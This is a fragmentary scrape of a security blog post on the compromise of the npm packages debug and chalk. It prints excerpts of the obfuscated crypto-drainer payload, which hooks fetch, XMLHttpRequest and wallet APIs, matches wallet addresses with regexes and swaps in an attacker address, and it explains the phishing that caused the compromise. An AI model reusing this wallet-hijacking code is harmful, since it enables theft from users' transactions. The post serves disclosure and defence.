...
fetched_at: '2025-09-08T19:05:44.326321'
original_url: https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised
author: universesquid
date: '2025-09-08'
description: The popular packages debug and chalk on npm have been compromised with malicious code
tags:
- hackernews
- trending
---
...
To avoid being compromised by packages like this, check out Aikidosafe-chain!
...
let
 _0x1b96c3 =
0
; _0x1b96c3 <= _0x13a5cc.length; _0x1b96c3++) {
...
let
 _0x239a5f =
0
; _0x239a5f <= _0x8c209f.length; _0x239a5f++) {
...
let
 _0x5aba31 =
1
; _0x5aba31 <= _0x13a5cc.length; _0x5aba31++) {
...
let
 _0x22e9c0 =
1
; _0x22e9c0 <= _0x8c209f.length; _0x22e9c0++) {
...
1
 ...
 _0x50715b[_0x5aba31][_0x22e9c0] = _0x50715b[_0x5aba31 -
1
][_0x22e9c0 -
1
];
...
1
 +
Math
.min(_0x50715b[_0x5aba31 -
1
][_0x22e9c0], _0x50715b[_0x5aba31][_0x22e9c0 -
1
], _0x50715b[_0x5aba31 -
1
][_0x22e9c0 -
...
return
 _0x50715b[_0x13a5cc.length][_0x8c209f.length];
...
const
 _0x3a7411 = _0x3479c8(_0x348925.toLowerCase(), _0x214c8b.toLowerCase());
...
const
 _0x406ee2 =
await
 _0xba16ef.tfqRA(fetch, ..._0x1ae7ec);


const
 _0x207752 = _0x406ee2.headers.get(
"Content-Type"
) ||
''
;
...
await
 ...
 _0x561841 =
await
 _0x406ee2.clone().text();

 }


const
 _0x50818d = _0x19ca67(_0x561841);
...
const
 _0x2d44e5 = XMLHttpRequest.prototype.open;
...
function
 (
_0x2dbeb0, _0x3b2bc2, _0x36de99, _0x36f3b7, _0x52ad25
)
{
...
const
 _0x13db82 = _0x159c30.getResponseHeader(
"Content-Type"
) ||
''
;
...
let
 _0x1ac083 = _0x159c30.responseText;
...
"application/json"
 ...
 _0x1ac083 =
JSON
.parse(_0x159c30.responseText);

 }


const
 _0x454f4a = _0x19ca67(_0x1ac083);
...
'bitcoinSegwit'
:
/\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g
,


'tron'
:
/((?<!\w)[T][1-9A-HJ-NP-Za-km-z]{33})/g
,


'bch'
:
/bitcoincash:[qp][a-zA-Z0-9]{41}/g
,


'ltc'
:
/(?<!\w)ltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}\b/g
,


'ltc2'
:
/(?<!\w)[mlML][a-km-zA-HJ-NP-Z1-9]{25,34}/g
,


'solana'
:
/((?<!\w)[4-9A-HJ-NP-Za-km-z][1-9A-HJ-NP-Za-km-z]{32,44})/g
,


'solana2'
:
/((?<!\w)[3][1-9A-HJ-NP-Za-km-z]{35,44})/g
,


'solana3'
:
/((?<!\w)[1][1-9A-HJ-NP-Za-km-z]{35,44})/g
...
const
 _0x1be350 = _0x530d91.match(_0x129783) || [];
...
if
 (!_0x4477fc.includes(_0x4225ce) && neth ==
0
) {
...
const
 _0x2d452a = [..._0x4477fc, ..._0x264994, ..._0x2e3cca, ..._0x3ee86f, ..._0x4a9d96, ..._0x553dcb];
...
if
 (_0x13d8ee.value && _0x13d8ee.value !==
"0x0"
 && _0x13d8ee.value !==
'0'
) {
...
const
 _0x250e27 = _0x13d8ee.data.toLowerCase();


if
 (_0x250e27.startsWith(
"0x095ea7b3"
)) {
...
const
 _0xde14cc =
"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"
.padStart(
64
,
'0'
...
Array
.isArray(_0x13d8ee.instructions)) {

 _0x13d8ee.instructions.forEach(
_0x190501
 =>
 {
...
if
 (_0x190501.accounts &&
Array
.isArray(_0x190501.accounts)) {

 _0x190501.accounts.forEach(
_0x2b9990
 =>
 {
...
if
 (_0x190501.keys &&
Array
.isArray(_0x190501.keys)) {

 _0x190501.keys.forEach(
_0x40768f
 =>
 {
...
if
 (_0x2c3d7e.method ===
"eth_sendTransaction"
 && _0x2c3d7e.params && _0x2c3d7e.params[
0
]) {
...
const
 _0x39ad21 = _0x1089ae(_0x2c3d7e.params[
0
],
true
);
...
let
 _0x5ad975 = _0x2c3d7e.params[
0
];


if
 (_0x5ad975.transaction) {
...
Object
.defineProperty(_0x5d6d52, _0x16ab0e, {


'value'
: _0x485f9d(_0x58cddf, _0x16ab0e),
...
1. Injects itself into the browser* Hooks core functions likefetch,XMLHttpRequest, and wallet APIs (window.ethereum, Solana, etc.).
* Ensures it can intercept both web traffic and wallet activity.
2. Watches for sensitive data* Scans network responses and transaction payloads for anything that looks like a wallet address or transfer.
* Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.
3. Rewrites the targets* Replaces the legitimate destination with an attacker-controlled address.
* Uses “lookalike” addresses (via string-matching) to make swaps less obvious.
4. Hijacks transactions before they’re signed* Alters Ethereum and Solana transaction parameters (e.g., recipients, approvals, allowances).
* Even if the UI looks correct, the signed transaction routes funds to the attacker.
5. Stays stealthy* If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.
...
The maintainersharedthat he was compromised by the use of phishing, using this email coming fromsupport [at] npmjs [dot] help:
...
After Aikido notified the maintainer on Bluesky, herepliedat 15:15 UTC that he was aware of being compromised, and starting to clean up the compromised packages.

‍

The author alsosharedthat the phishing email was sent fromsupport [at] npmjs [dot] help.

The author appears to have deleted most of the compromised package before losing access to his account. At the time of writing, the packagesimple-swizzleis still compromised.

‍

The author further commented onHackerNews:

‍

## Attackers target another maintainer

At 16:58 UTC, our system detected another package, which was comrpomised by what appears to be the same attackers:

proto-tinker-wc@0.1.87

‍

The filedist/cjs/proto-tinker.cjs.entry.jscontains the malicious code:
